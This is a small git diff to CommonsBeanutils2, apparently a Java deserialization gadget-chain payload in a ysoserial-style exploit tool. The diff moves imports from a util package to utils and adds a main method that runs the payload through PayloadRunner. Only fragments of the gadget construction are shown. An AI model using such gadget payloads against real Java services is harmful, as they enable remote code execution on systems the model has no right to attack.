@@ -1,10 +1,11 @@
 package A.R.ysogate.payloads.gadgets;
 
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import org.apache.commons.beanutils.BeanComparator;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Gadgets;
-import A.R.ysogate.payloads.util.Reflections;
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.Reflections;
 
 import java.util.PriorityQueue;
 
@@ -24,5 +25,9 @@ public class CommonsBeanutils2 implements ObjectPayload<Object> {
 		Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
 
 		return queue;
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(CommonsBeanutils2.class, args);
 	}
 }
